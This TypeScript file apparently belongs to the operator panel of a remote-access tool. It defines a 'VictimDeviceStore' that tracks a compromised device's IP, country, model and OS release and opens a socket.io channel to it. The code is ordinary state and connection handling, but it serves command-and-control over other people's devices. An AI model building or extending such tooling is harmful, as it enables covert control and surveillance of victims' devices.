import { action, makeObservable, observable } from 'mobx';
import { io, type Socket } from 'socket.io-client';

import { SOCKET_NAMESPACE_DEVICE } from '../../common/constants';
import { ConnectionStatus, type VictimStatus } from '../../common/enums';
import {
    type IBaseEntity,
    type IServerToVictimEvents,
    type IVictim,
    type IVictimToServerEvents,
} from '../../common/interfaces';

export class VictimDeviceStore implements IBaseEntity, IVictim {
    public id: string;
    public deviceId: string;
    public ip: string;
    public port: number;
    public country: string;
    public manf: string;
    public model: string;
    public release: string;
    public status: VictimStatus;
    public createdAt: number;
    public updatedAt: number;

    private readonly socket: Socket<
        IVictimToServerEvents,
        IServerToVictimEvents
    >;

    public connectionStatus: ConnectionStatus = ConnectionStatus.DISCONNECTED;
    public open: boolean = false;

    public constructor(input: IBaseEntity & IVictim) {
        this.id = input.id;
        this.deviceId = input.deviceId;
        this.ip = input.ip;
        this.port = input.port;
        this.country = input.country;
        this.manf = input.manf;
        this.model = input.model;
        this.release = input.release;
        this.status = input.status;
        this.createdAt = input.createdAt;
        this.updatedAt = input.updatedAt;

        this.socket = io(SOCKET_NAMESPACE_DEVICE, {
            autoConnect: false,
            query: {
                deviceId: this.deviceId,
            },
            forceNew: true,
        });

        this.setupListeners();

        makeObservable(this, {
            connectionStatus: observable,
            open: observable,
            setOpen: action,
        });
    }

    private setupListeners(): void {
        this.socket.on('connect', () => {
            this.setConnectionStatus(ConnectionStatus.CONNECTED);
            console.log(`[VICTIM] Device ${this.deviceId} connected`);
        });

        this.socket.on('disconnect', () => {
            this.setConnectionStatus(ConnectionStatus.DISCONNECTED);
            console.log(`[VICTIM] Device ${this.deviceId} disconnected`);
        });

        this.socket.io.on('error', (error) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.log(
                `[VICTIM] Device ${this.deviceId} error: ${error.message}`,
            );
        });

        this.socket.io.on('reconnect_attempt', (attempt) => {
            this.setConnectionStatus(ConnectionStatus.CONNECTING);
            console.log(
                `[VICTIM] Device ${this.deviceId} reconnecting`,
                attempt,
            );
        });

        this.socket.io.on('reconnect', (attempt) => {
            this.setConnectionStatus(ConnectionStatus.CONNECTED);
            console.log(
                `[VICTIM] Device ${this.deviceId} reconnected`,
                attempt,
            );
        });

        this.socket.io.on('reconnect_error', (error) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.log(
                `[VICTIM] Device ${this.deviceId} reconnect error: ${error.message}`,
            );
        });

        this.socket.io.on('reconnect_failed', () => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.log(`[VICTIM] Device ${this.deviceId} reconnect failed`);
        });
    }

    private setConnectionStatus(connectionStatus: ConnectionStatus): void {
        this.connectionStatus = connectionStatus;
    }

    public setOpen(open: boolean): void {
        this.open = open;

        if (open) {
            this.socket.connect();
        } else {
            this.socket.disconnect();
        }
    }
}
